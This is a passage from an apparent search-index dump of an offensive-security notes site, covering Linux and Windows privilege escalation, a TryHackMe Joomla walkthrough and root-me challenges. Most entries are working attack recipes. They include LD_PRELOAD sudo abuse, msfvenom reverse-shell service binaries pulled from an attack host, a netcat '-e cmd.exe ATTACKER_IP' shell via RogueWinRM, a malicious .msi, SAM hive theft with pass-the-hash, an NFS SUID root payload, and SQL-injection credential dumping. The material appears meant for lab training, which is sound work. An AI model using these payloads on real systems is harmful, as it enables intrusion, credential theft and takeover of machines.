doesn’t have a shell escape sequence on GTFOBins. Which is it? Answer: apache2 Consider how you might use this program with sudo to gain root privileges without a shell escape sequence. Sudo - Environment variables  sudo can be configured to inherit certain environment variables from the user’s environment. Check which environment variables are inherited (look for the env_keep options): sudo -l LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user’s environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first. Create a shared object using the code located at /home/user/tools/sudo/preload.c : gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c Run one of the programs you are allowed to run via sudo (listed when running sudo -l ), while setting the LD_PRELOAD environment variable to the full path of the new shared object: sudo LD_PRELOAD=/tmp/preload.so program-name-here A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well. Run ldd against the apache2 program file to see which shared libraries are used by the program: ldd /usr/sbin/apache2 Create a shared object with the same name as one of the listed libraries ( libcrypt.so.1 ) using the code located at /home/user/tools/sudo/library_path.c : gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c Run apache2 using sudo , while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object): sudo LD_LIBRARY_PATH=/tmp apache2 A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work. Exit out of the root shell before continuing! Cron jobs - File permissions  Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab . View the contents of the system-wide crontab: cat /etc/crontab There should be two cron jobs scheduled to run every minute. One runs overwrite.sh , the other runs /usr/local/bin/compress.sh . Locate the full path of the overwrite.sh file: locate overwrite.sh Note that the file is world-writable: ls -l /usr/local/bin/overwrite.sh Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box. #!/bin/bash bash...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "79b2a53e21d5064043e4d3a94a4d1564",
    "u": "https://exploitation.tymyrddin.dev/docs/windows/services",
    "t": "Abusing service misconfigurations ",
    "c": "Abusing service misconfigurations  Escalate through insecure permissions on service executable: Misconfigured Service executable DACL (modifiable permissions on the executable) Reverse shell payload replacing service executable Listener on attack machine Escalate through unquoted service path: Service binaries in a non-default path BUILTIN\\Users group has AD and WD privileges Reverse shell exe-service payload Listener on attack machine Escalate through insecure service permissions: Misconfigured Service DACL Reverse shell exe-service payload Listener on attack machine Examples  WindowsScheduler  Check service with sc cq : C:\\> sc qc WindowsScheduler [SC] QueryServiceConfig SUCCESS SERVICE_NAME: windowsscheduler TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 0 IGNORE BINARY_PATH_NAME : C:\\PROGRA~2\\SYSTEM~1\\WService.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : System Scheduler Service DEPENDENCIES : SERVICE_START_NAME : .\\svcuser1 Check the permissions on the executable: C:\\Users\\unprivilegedusername>icacls C:\\PROGRA~2\\SYSTEM~1\\WService.exe C:\\PROGRA~2\\SYSTEM~1\\WService.exe Everyone:(I)(M) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Users:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX) The Everyone group has modify permissions (M) on the service’s executable. We can overwrite it with any payload, and the service will execute it with the privileges of the configured user account. Generate an exe-service payload using msfvenom and serve it through a python webserver: # msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=4445 -f exe-service -o rev-svc.exe # python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... On the target machine, in powershell, pull it down: wget http://<IP address attack machine>:8000/rev-svc.exe -O rev-svc.exe Replace the service executable with the payload: C:\\> cd C:\\PROGRA~2\\SYSTEM~1\\ C:\\PROGRA~2\\SYSTEM~1> move WService.exe WService.exe.bkp 1 file(s) moved. C:\\PROGRA~2\\SYSTEM~1> move C:\\Users\\unprivilegedusername\\rev-svc.exe WService.exe 1 file(s) moved. C:\\PROGRA~2\\SYSTEM~1> icacls WService.exe /grant Everyone:F Successfully processed 1 files. Start listener on attack machine: # nc -lvp 4445 Wait for the service to restart. Disk Sorter Enterprise  An unquoted service path was found. C:\\> sc qc \"disk sorter enterprise\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: disk sorter enterprise TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 0 IGNORE BINARY_PATH_NAME : C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Disk Sorter Enterprise DEPENDENCIES : SERVICE_START_NAME : .\\svcusr2 Generate an exe-service payload using msfvenom and serve it through a python webserver: # msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=4446 -f exe-service -o rev-svc2.exe # python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... On the target machine, in powershell, pull it down: wget http://<IP address attack machine>:8000/rev-svc2.exe -O rev-svc2.exe Move it to any of the locations where hijacking might occur. For example, move it to C:\\MyPrograms\\Disk.exe , and grant Everyone full permissions on the file to make sure it can be executed by the service: C:\\> move C:\\Users\\unprivilegedusername\\rev-svc2.exe C:\\MyPrograms\\Disk.exe C:\\> icacls C:\\MyPrograms\\Disk.exe /grant Everyone:F Successfully processed 1 files. Start listener on attack machine: # nc -lvp 4446 Start the “updated” service: C:\\> sc stop \"disk sorter enterprise\" C:\\> sc start \"disk sorter enterprise\" Misconfigured Service DACL  Download Accesschk from the Sysinternals suite to C:\\\\tools . Check a namedservice DACL: C:\\tools\\AccessChk> accesschk64.exe -qlc namedservice [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\\SYSTEM SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_PAUSE_CONTINUE SERVICE_START SERVICE_STOP SERVICE_USER_DEFINED_CONTROL READ_CONTROL [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\\Users SERVICE_ALL_ACCESS The BUILTIN\\\\Users group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service. Build another exe-service reverse shell and start a listener for it on the attacker’s machine: # msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=4447 -f exe-service -o rev-svc3.exe # nc -lvp 4447 # python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... On the target machine, in powershell, pull it down: wget http://<IP address attack machine>:8000/rev-svc3.exe -O rev-svc3.exe Grant permissions to Everyone : C:\\> icacls C:\\Users\\unprivilegedusername\\rev-svc3.exe /grant Everyone:F Change the service’s associated executable and account: C:\\> sc config NamedService binPath= \"C:\\Users\\unprivilegedusername\\rev-svc3.exe\" obj= LocalSystem We can use any account to run the service. LocalSystem is just the highest privileged account available. To trigger the payload, restart the service: C:\\> sc stop NamedService C:\\> sc start NamedService Notes  Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services. Use the sc qc someservice command for more info on a service. The associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter. Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. All services configurations are stored in the registry under HKLM\\SYSTEM\\CurrentControlSet\\Services\\ A subkey exists for every service in the system. If a DACL has been configured for the service, it will be stored in a subkey called Security . Only administrators can modify such registry entries by default. Insecure Permissions on Service Executable  If an executable associated with a service has weak permissions that allow an adversary to modify or replace it, the adversary can gain the privileges of the service’s account. Unquoted path vulnerability  When we can’t directly write into service executables, there might still be a chance. Most of the service executables will be installed under C:\\Program Files or C:\\Program Files (x86) by default, which isn’t writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule. Some installers change the permissions on the installed folders, making the services vulnerable. An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, an “Unquoted Service Paths vulnerability” (if found) can be exploited. For example, the Administrator installed the Disk Sorter binaries under c:\\MyPrograms . By default, this inherits the permissions of the C:\\ directory, which allows any user to create files and folders in it. Check with icacls in the Command Prompt: C:\\>icacls c:\\MyPrograms c:\\MyPrograms NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F) BUILTIN\\Administrators:(I)(OI)(CI)(F) BUILTIN\\Users:(I)(OI)(CI)(RX) BUILTIN\\Users:(I)(CI)(AD) BUILTIN\\Users:(I)(CI)(WD) CREATOR OWNER:(I)(OI)(CI)(IO)(F) The BUILTIN\\\\Users group has AD and WD privileges, allowing a user to create subdirectories and files. The Unquoted in “Unquoted Service Paths vulnerability” means that the path of the associated executable is not properly quoted to account for spaces on the command. Quoted: BINARY_PATH_NAME : \"C:\\Program Files\\RealVNC\\VNC Server\\vncserver.exe\" -service Unquoted: BINARY_PATH_NAME : C:\\MyPrograms\\Disk Sorter...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "6078c42dbfd2468d6ab5ebe4a7e4d3c8",
    "u": "https://exploitation.tymyrddin.dev/docs/notes/common",
    "t": "Exploiting vulnerabilities ",
    "c": "Exploiting vulnerabilities  Malware, more specifically ransomware, continues to be a significant threat. We are talking exploits. Supply chain attacks are relatively new but continue to grow in size and frequency. Cloud-based threats encompass a wide range of TTPs. And with so many businesses using the cloud, and cloud networks and the offered services becoming more intricate, their infrastructure has become “low-hanging fruit”. Social engineering: phishing, spear phishing, whaling, smishing, vishing, baiting, piggybacking/tailgating, … Insider threats. Mobile devices: many more infiltration opportunities than ever before. Each cybersecurity threat is a learning opportunity, but most organisations do not have an incident strategy and incident response team. And there may be incidents that were not noticed, and have been ungoing for a loooong time already … Social engineering  Social engineering is the use of deception to try to trick a user into compromising system security through an email message, a text message, a phone call, etc. Social engineering attacks are a common way to test the effectiveness of a company’s security education program. Application-based  Injection attacks  Injection attacks are one of the most common types of attacks against applications today. Web applications are especially vulnerable because they are internet-facing and their audience is extended out to the Internet. Authentication attacks  Authentication attacks are methods that can be used to try to bypass the authentication or compromise the security of the application by cracking the application’s passwords. Authorisation attacks  After a user authenticates to an application or API, the user is then authorised to perform different actions while using the application or API. A vulnerable application may not have authorisation configured properly and simply allows users and other applications to perform any task within the application. XSS and CSRF/XSRF attacks  Cross-site scripting, or XSS for short, is one of the most common vulnerabilities found in web applications and involves the hacker injecting client-side script into a web page that is then viewed and executed by others at a later time. The goal of a CSRF/ XSRF attack is to get an unsuspecting user to submit data to a website the user has already logged on to. A CSRF/XSRF attack leverages the fact that the site has already authenticated the user to the site, and therefore trusts all actions from the user. Network-based vulnerabilities  Exploits that are created to leverage network-based vulnerabilities are interesting exploits because the attacks are performed across the network — an adversary does not need local access to the systems. Network-based vulnerabilities can lead to compromise of the target operating system, privilege escalation, or loss or degradation of service performance. Most network-based vulnerabilities can be identified withvulnerability assessment, or by vulnerability research. The Metasploit Framework or SearchSploit can be used to validate public exploits for vulnerabilities identified during a vulnerability assessment. Common public exploits are Name-resolution exploits; Link-Local Multicast Name Resolution (LLMNR)/NetBIOS Name Service(NBT-NS) poisoning; New Technology LAN Manager (NTLM) relay attacks; SMB exploits; SNMP exploits; SMTP exploits; to name but a few. Local host vulnerabilities  Systems today are a variety of devices, and each type of device comes with its own list of vulnerabilities: Operating system vulnerabilities; Unsecure service and protocol configurations; Privilege escalation vulnerabilities; Default account settings; Sandbox escape possibilities; and Physical device security vulnerabilities.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d0e871d419dee4e12a63ecda618cb870",
    "u": "https://exploitation.tymyrddin.dev/docs/windows/privileges",
    "t": "Abusing dangerous privileges ",
    "c": "Abusing dangerous privileges  SeBackup/SeRestore abuse SeTakeOwnership abuse SeImpersonate/SeAssignPrimaryToken abuse Examples  SAM and SYSTEM registry  This hack consists of copying the SAM and SYSTEM registry hives to extract the local Administrator’s password hash. Check currently assigned privileges: whoami /priv The current account ( Backup ) is part of the “Backup Operators” group, which by default is granted the SeBackup and SeRestore privileges. Open a command prompt with the “Open as administrator” option to use these privileges. Check privileges again: C:\\> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled Backup the SAM and SYSTEM hashes: C:\\> reg save hklm\\system C:\\Users\\Backup\\system.hive The operation completed successfully. C:\\> reg save hklm\\sam C:\\Users\\Backup\\sam.hive The operation completed successfully. Copy these files to the attacker machine using SMB or any other available method. For SMB, use impacket’s smbserver.py to start a simple SMB server with a network share in the current directory. # mkdir share # python3 /opt/impacket/examples/smbserver.py -smb2support -username Backup -password <password of Backup> public share Use the copy command in the Windows machine to transfer both files to the attack machine: C:\\> copy C:\\Users\\Backup\\sam.hive \\\\<IP address attack machine>\\public\\ C:\\> copy C:\\Users\\Backup\\system.hive \\\\<IP address attack machine>\\public\\ Use impacket to retrieve the users’ password hashes: # python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL Use the Administrator’s hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges: # python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@<IP address attack machine> ... C:\\Windows\\system32> whoami nt authority\\system Replacing Utilman  Open a command prompt using “Open as administrator” and check privileges: C:\\> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ======================================== ======== SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen. It is run with SYSTEM privileges, so SYSTEM privileges can be gained by replacing the original binary with any payload. Because we can take ownership of any file, replacing it is trivial. Take ownership of utilman.exe : C:\\> takeown /f C:\\Windows\\System32\\Utilman.exe SUCCESS: The file (or folder): \"C:\\Windows\\System32\\Utilman.exe\" now owned by user \"WINPRIVESC2\\thmtakeownership\". Give the user you are logged in as, full permissions over utilman.exe C:\\> icacls C:\\Windows\\System32\\Utilman.exe /grant THMTakeOwnership:F processed file: Utilman.exe Successfully processed 1 files; Failed processing 0 files Replace utilman.exe with a copy of cmd.exe : C:\\Windows\\System32\\> copy cmd.exe utilman.exe 1 file(s) copied. To trigger utilman, lock the screen from the start button, then click on the “Ease of Access” button, which runs utilman.exe with SYSTEM privileges. C:\\Windows\\system32> whoami nt authority\\system FTP impersonation  An FTP service running with user ftp . Without impersonation, if a user logs into the FTP server and tries to access ftp files, the FTP service would try to access them with its access token rather than Ann’s. With ftp token like this, we must manually configure specific permissions for each served file/directory. The ftp user has access to all files. If the FTP service were compromised at some point, the attacker would immediately gain access to all folders to which the ftp user has access. If instead, the FTP service’s user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf. If we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process. Plant a web shell on http://IP address target/ Use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest. Upload RogueWinRM to the target machine. The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, a port that exposes a Powershell console to be used remotely through the network. Start a netcat listener: # nc -lvp 4442 Use the web shell to trigger the RogueWinRM exploit: c:\\tools\\RogueWinRM\\RogueWinRM.exe -p \"C:\\tools\\nc64.exe\" -a \"-e cmd.exe ATTACKER_IP 4442\" The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. The exploit may take up to 2 minutes to work, so the browser may appear unresponsive for a bit. c:\\windows\\system32\\inetsrv>whoami nt authority\\system Notes  Privileges are rights that an account has to perform specific system-related tasks. These tasks can be from the privilege to shut down the machine up to privileges to bypass some DACL-based access controls. SeBackup/SeRestore  The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges. Having this power, an adversary can trivially escalate privileges on the system by using many techniques. SeTakeOwnership  The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges. For example, search for a service running as SYSTEM and take ownership of the service’s executable. SeImpersonate/SeAssignPrimaryToken  These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user. Resources  Privilege Constants (Authorization) Priv2Admin",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b11264511242ac927d2f0e5d152acd17",
    "u": "https://exploitation.tymyrddin.dev/docs/windows/software",
    "t": "Abusing vulnerable software ",
    "c": "Abusing vulnerable software  Vulnerability in software Available exploit Example  Use the wmic tool to list software installed on the target system and its versions: Search for existing exploits on the installed software online on sites like exploit-db, packet storm or Google. Exploit Notes  Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c3c45fd7bb5d43f583e868ca8bd41831",
    "u": "https://exploitation.tymyrddin.dev/docs/windows/quick",
    "t": "Quick misconfiguration wins ",
    "c": "Quick misconfiguration wins  Escalate through misconfigurations Scheduled tasks AlwaysInstallElevated Examples  Scheduled tasks  List scheduled tasks: C:\\> schtasks /query /tn vulntask /fo list /v Folder: \\ HostName: THM-PC1 TaskName: \\vulntask Task To Run: C:\\tasks\\schtask.bat Run As User: taskusr1 ... The Task To Run is of interest. If the current user can modify or overwrite the executable, we can control what gets executed by the taskusr1 user, giving a simple privilege escalation. Check the file permissions on the executable: C:\\> icacls c:\\tasks\\schtask.bat c:\\tasks\\schtask.bat NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Users:(I)(F) In this case, the BUILTIN\\Users group has full access (F) over the task’s binary. This means we can modify the .bat file and insert any payload. Change the .bat file to spawn a reverse shell: C:\\> echo c:\\tools\\nc64.exe -e cmd.exe <IP address attack machine> 4444 > C:\\tasks\\schtask.bat And start a listener on the attack machine: nc -lvp 4444 The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. Depending on when the task is scheduled to run, this may take a looong time. AlwaysInstallElevated  Query the registry values: C:\\> reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer C:\\> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer Both should be set for this exploitation to work. Generate an evil .msi file using msfvenom : msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=<port-number> -f msi -o evil.msi Run the Metasploit Handler module configured accordingly. Transfer the file to C:\\Windows\\Temp on the target machine. Run the installer with the command below and receive the reverse shell: C:\\> msiexec /quiet /qn /i C:\\Windows\\Temp\\evil.msi Notes  These belong more to the realm of CTF events rather than real world scenarios. Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it is using a modifiable binary. Windows installer files ( .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. And they can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow for generating a malicious .msi file that would run with admin privileges.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5d963da4d612c7ff8fd36f85e4457cef",
    "u": "https://exploitation.tymyrddin.dev/docs/linux/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  There are many ways to escalate linux privileges. These are the most common methods based on common real-world misconfigurations and flaws. Why?  Gain access to additional users, hosts, and resources, be able to take action, like install software, to get user data that can possibly give access to even more sites or systems, destroy or alter audit trails to hide tracks of having been there, etc. How?  Reuseful escalation patterns Kernel vulnerability exploits Exploit sudo misconfigurations SUID and SGID exploits Exploit capable programs Cron jobs exploits Path exploits NFS exploits Shellcode techniques",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "641c4a3d11abf97d3406ba04b0301d10",
    "u": "https://exploitation.tymyrddin.dev/docs/linux/nfs",
    "t": "NFS exploits ",
    "c": "NFS exploits  Become root on Linux via NFS exploits: Look for no_root_squash shares Mount share Create a payload Bash binary with an SUID bit C binary with an SUID bit Execute the payload on the target mac hine to escalate privileges Unmount the shared directory in the attacker machine Example: /tmp share  Get information: $ ps aux | grep nfsd $ cat /etc/exports There is a /tmp share with no_root_squash set. Shares with the no_root_squash option can possibly be modified and executed as root. On the attacker machine install the NFS client package: sudo apt install nfs-common On the attacker machine, create a directory to host the NFS share: mkdir /tmp/nfs With sudo , mount the remote share in the /tmp/nfs directory sudo mount -o rw,vers=2 <target IP address>:/tmp /tmp/nfs Or: sudo mount -t nfs <target IP address>:/tmp /tmp/nfs Payload Bash binary with an SUID bit: sudo cp /bin/bash /tmp/nfs/bash && sudo chmod u+s /tmp/nfs/bash C binary with an SUID bit - you may need to change the /usr/bin/bash to /bin/bash , depending on location of bash in the target machine: #include <stdio.h> #include <unistd.h> #include <sys/types.h> int main() { setresuid(0, 0, 0); setuid(getuid()); system(\"/usr/bin/bash\"); return 0; } Compile: gcc payload.c -o payload && sudo rm /tmp/nfs/payload 2>/dev/null; sudo cp payload /tmp/nfs Set de SUID bit: sudo chmod u+s /tmp/nfs/payload In the target machine, execute the payload to escalate privileges: :/tmp$ ./bash -p # whoami root # exit :/tmp$ ./payload :/tmp# id uid=0(root) gid=1000(low) ... Unmount the shared directory in the attacker machine: sudo umount /tmp/nfs Notes  The NFS configuration file is /etc/exports : no_root_squash : This option basically gives authority to the root user on the client (us, our attacker host) to access files on the NFS server as root. This is bad, as we can create malicious files on the NFS share as the root user. no_all_squash : This is similar to no_root_squash option but applies to non-root users.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "3d044a00dbacbe16b4ed3feb64a7a91d",
    "u": "https://exploitation.tymyrddin.dev/docs/thm/bugle",
    "t": "The Daily Bugle ",
    "c": "https://tryhackme.com/room/dailybugle The Daily Bugle  Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum. Scanning  Run a simple port scan (without Ping) # nmap -Pn -p- <IP address target machine> -oN portscan portscan: # Nmap 7.92 scan initiated Sat Oct 1 22:50:08 2022 as: nmap -Pn -p- -oN portscan 10.10.38.105 Nmap scan report for 10.10.38.105 Host is up (0.043s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3306/tcp open mysql # Nmap done at Sat Oct 1 22:51:17 2022 -- 1 IP address (1 host up) scanned in 69.03 seconds Run an -A scan on the open ports: # nmap -Pn -T4 -A -p22,80,3306 <IP address target machine> -oN servicescan servicescan: # Nmap 7.92 scan initiated Sat Oct 1 22:51:25 2022 as: nmap -Pn -T4 -A -p22,80,3306 -oN servicescan 10.10.38.105 Nmap scan report for 10.10.38.105 Host is up (0.039s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA) | 256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA) |_ 256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.6.40) | http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/ |_http-generator: Joomla! - Open Source Content Management |_http-title: Home |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40 3306/tcp open mysql MariaDB (unauthorized) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.19 (92%), Linux 3.2 - 4.9 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 38.60 ms 10.9.0.1 2 38.79 ms 10.10.38.105 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Oct 1 22:51:44 2022 -- 1 IP address (1 host up) scanned in 19.41 seconds Exploring  http://10.10.38.105 Get version via the joomla.xml file: http://10.10.38.105/administrator/manifests/files/joomla.xml Or get version from README.txt: # curl -s http://<IP address target machine>/README.txt | head Check for Joomla 3.7.0 vulnerabilities: # searchsploit joomla 3.7.0 ---------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------- --------------------------------- Joomla! 3.7.0 - 'com_fields' SQL Injection | php/webapps/42033.txt Joomla! Component Easydiscuss < 4.0.21 - Cros | php/webapps/43488.txt ---------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results Mirroring: # searchsploit -m php/webapps/42033.txt Exploit: Joomla! 3.7.0 - 'com_fields' SQL Injection URL: https://www.exploit-db.com/exploits/42033 Path: /usr/share/exploitdb/exploits/php/webapps/42033.txt File Type: ASCII text Apparently, this version of Joomla is affected by a blind SQL injection in the list[fullordering] parameter. In browser, run the payloaod provided by SQLMap to confirm the endpoint is vulnerable: http://10.10.38.105/index.php?option=com_fields&view=fields&layout= modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu) Gaining a foothold  Run SQLMap using the arguments specified in the exploit: sqlmap -u \"http://<IP address target machine>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] Takes ages. The users table may contain credentials to access the Joomla administration section. Dump the username and password columns from the users table: sqlmap -u \"http://<IP address target machine>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent -D joomla -T \"#__users\" -C username,password -p list[fullordering] --dump As an alternative, this python script is specific for Joomla: # wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py # python joomblah.py http://<IP address target machine> Put hash in a file named hash.txt and crack the hash: # john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0:00:00:19 0.01% (ETA: 2022-10-04 09:12) 0g/s 83.11p/s 83.11c/s 83.11C/s rock you..gymnastics 0g 0:00:00:21 0.01% (ETA: 2022-10-04 11:22) 0g/s 81.01p/s 81.01c/s 81.01C/s 2hot4u..sexylove spiderman123 (?) 1g 0:00:10:44 DONE (2022-10-02 00:27) 0.001551g/s 72.65p/s 72.65c/s 72.65C/s thelma1..speciala Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Privilege escalation  Log in with the found username and password. Yum is a free and open-source command-line package-management utility for Linux-based operating system which uses the RPM Package Manager. According to GTFOBins yum , yum can be used to escalate privileges by crafting an RPM package and installing it on the victim machine. Follow the steps given.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "f9c2f168533bda65f673a251299f2a9b",
    "u": "https://exploitation.tymyrddin.dev/docs/root-me/python-input",
    "t": "Python input() ",
    "c": "Python input()  root-me challenge: Python - input() : Get the password in the .passwd file by exploiting a vulnerability in the given python script. sys.stdout is a built-in file object analogous to the interpreter’s standard output stream in Python. stdout is used to display output directly to the screen console. Output can be of any form, even output from an expression statement such as open(\".passwd\").readline() .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5d136c442d87098add7219f313408555",
    "u": "https://exploitation.tymyrddin.dev/docs/windows/shellcode",
    "t": "Shellcode techniques ",
    "c": "Shellcode techniques  In Windows, applications do not make direct use of system calls, but make use of Windows API (WinAPI) calls. WinAPI, in turn, makes a request to the Native API (NtAPI), which makes use of a system call. There are a number of techniques that can be used for shellcode development for Windows, ranging from buffer overflow attacks to attacks leveraging pointers (eggs), backdooring PE files, and so on. Resources  Deeper into Windows Architecture",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "6dc1f9e1c5a598e88b351ffdddc471aa",
    "u": "https://exploitation.tymyrddin.dev/docs/root-me/bash1",
    "t": "Bash: System 1 ",
    "c": "Bash: System 1  root-me challenge: ELF32-System-1 : Find your path, padawan! Source #include <stdlib.h> #include <stdio.h> /* gcc -m32 -o ch11 ch11.c */ int main(void) { system(\"ls /challenge/app-script/ch11/.passwd\"); return 0; } The ls command is not using an absolute path. Resources  Dangers of SUID Shell Scripts SUID Privileged Programs",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2deb9d80c5bb64c5cea85f846ae8ff45",
    "u": "https://exploitation.tymyrddin.dev/docs/notes/infrastructure",
    "t": "Attack infrastructures ",
